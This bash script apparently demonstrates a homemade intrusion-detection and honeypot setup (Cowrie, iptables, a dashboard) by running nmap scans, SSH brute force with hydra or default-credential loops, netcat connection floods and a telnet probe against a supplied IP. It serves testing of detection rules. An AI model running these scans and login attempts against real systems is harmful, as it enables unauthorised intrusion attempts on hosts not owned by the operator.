#!/bin/bash
# ============================================================
# ATTACKER LAPTOP — Probe Demo Scripts
# Each attack triggers a different detection rule
# ============================================================
TARGET="${1:-YOUR_AWS_IP}"

if [ "$TARGET" = "YOUR_AWS_IP" ]; then
  echo "Usage: ./attack_demo.sh <AWS_PUBLIC_IP>"
  exit 1
fi

echo "═══════════════════════════════════════════════════════"
echo " Probe Attack Demo   Target: $TARGET"
echo "═══════════════════════════════════════════════════════"
echo ""

# ── ATTACK 1: nmap SYN scan ──────────────────────────────────
# Triggers: "Port Scan (nmap)" rule (>10 distinct ports in 30s)
# Hits iptables LOG — works even though Cowrie doesn't see it
attack_portscan(){
  echo "[1] nmap SYN scan → triggers Port Scan rule"
  echo "    Scanning ports 1-500..."
  nmap -sS -T4 -p 1-500 --open $TARGET 2>/dev/null || \
  nmap -T4 -p 1-500 $TARGET
  echo "[✓] Done"
}

# ── ATTACK 2: nmap service version scan ─────────────────────
# Triggers: "Multi-Service Probe" + "Port Scan (nmap)"
# -sV forces full TCP connection → Cowrie sees it AND iptables sees it
attack_service_scan(){
  echo "[2] nmap service scan → triggers Multi-Service Probe rule"
  nmap -sV -T3 -p 21,22,23,25,80,443,3306,5432,6379,8080 $TARGET
  echo "[✓] Done"
}

# ── ATTACK 3: SSH brute force ────────────────────────────────
# Triggers: "SSH Brute Force" rule (>5 failed logins)
# Uses hydra or manual SSH — Cowrie captures every attempt
attack_ssh_brute(){
  echo "[3] SSH brute force → triggers SSH Brute Force rule"

  # Method A: hydra (if installed)
  if command -v hydra &>/dev/null; then
    echo "    Using hydra..."
    hydra -l root -P /usr/share/wordlists/rockyou.txt \
      -t 4 -f ssh://$TARGET 2>/dev/null | head -5 || \
    hydra -l root -p "password:123456:admin:root:toor:pass:test:abc123" \
      ssh://$TARGET -t 4 2>/dev/null | head -5 || true

  # Method B: manual SSH attempts (always works)
  else
    echo "    Using manual SSH attempts..."
    for user in root admin administrator ubuntu ec2-user pi oracle; do
      for pass in password 123456 admin root toor pass test letmein; do
        ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=3 \
            -o PasswordAuthentication=yes \
            -o PreferredAuthentications=password \
            -p 22 ${user}@${TARGET} exit 2>/dev/null &
        sleep 0.2
      done
    done
    wait
  fi
  echo "[✓] Done"
}

# ── ATTACK 4: Rapid connection flood ────────────────────────
# Triggers: "Rapid Connections" rule (>15 conns in 10s)
# Uses nc to open many TCP connections fast
attack_rapid_conn(){
  echo "[4] Rapid connection flood → triggers Rapid Connections rule"
  echo "    Opening 25 connections in 5 seconds..."
  for i in $(seq 1 25); do
    (nc -z -w1 $TARGET 22 2>/dev/null || true) &
    (nc -z -w1 $TARGET 80 2>/dev/null || true) &
    sleep 0.1
  done
  wait
  echo "[✓] Done"
}

# ── ATTACK 5: Telnet probe ───────────────────────────────────
# Cowrie sees this as a telnet session attempt
attack_telnet(){
  echo "[5] Telnet probe → Cowrie session + multi-service"
  echo "exit" | nc -w3 $TARGET 23 2>/dev/null || \
  telnet $TARGET 23 <<< $'\x1dclose\n' 2>/dev/null || true
  echo "[✓] Done"
}

# ── ATTACK 6: Full combo (best for demo panel) ───────────────
# Triggers ALL rules in sequence — looks dramatic on graph
attack_full_demo(){
  echo ""
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  echo " FULL DEMO SEQUENCE"
  echo " Watch the dashboard — each step triggers a rule"
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

  echo ""
  echo "Step 1/4: Port scan (watch Port Scan rule fire)..."
  nmap -T4 -p 1-200 $TARGET 2>/dev/null || nmap -p 1-200 $TARGET
  sleep 4

  echo ""
  echo "Step 2/4: Service scan (Multi-Service Probe)..."
  nmap -sV -T3 -p 21,22,23,80,443 $TARGET 2>/dev/null || true
  sleep 4

  echo ""
  echo "Step 3/4: Rapid connections (Rapid Connections rule)..."
  for i in $(seq 1 20); do
    nc -z -w1 $TARGET 22 2>/dev/null &
    nc -z -w1 $TARGET 80 2>/dev/null &
    sleep 0.15
  done
  wait
  sleep 4

  echo ""
  echo "Step 4/4: SSH brute force (Brute Force rule)..."
  for user in root admin ubuntu pi; do
    for pass in password 123456 admin; do
      ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
          -o PasswordAuthentication=yes \
          -o PreferredAuthentications=password \
          -p 22 ${user}@${TARGET} exit 2>/dev/null &
      sleep 0.3
    done
  done
  wait

  echo ""
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  echo " DONE — Check dashboard for:"
  echo "  • Red probe node for your IP"
  echo "  • Multiple rule badges"
  echo "  • Graph: host → many services + port ranges"
  echo "  • IP auto-blocked"
  echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# ── MENU ────────────────────────────────────────────────────
echo "Select attack:"
echo "  1) nmap SYN scan         → Port Scan rule"
echo "  2) nmap service scan     → Multi-Service + Port Scan"
echo "  3) SSH brute force       → Brute Force rule"
echo "  4) Rapid connection flood→ Rapid Connections rule"
echo "  5) Telnet probe          → Multi-Service rule"
echo "  6) FULL DEMO (all rules) ← USE THIS FOR PANEL"
echo ""
read -p "Choice [1-6]: " c
case $c in
  1) attack_portscan ;;
  2) attack_service_scan ;;
  3) attack_ssh_brute ;;
  4) attack_rapid_conn ;;
  5) attack_telnet ;;
  6) attack_full_demo ;;
  *) echo "Invalid"; exit 1 ;;
esac
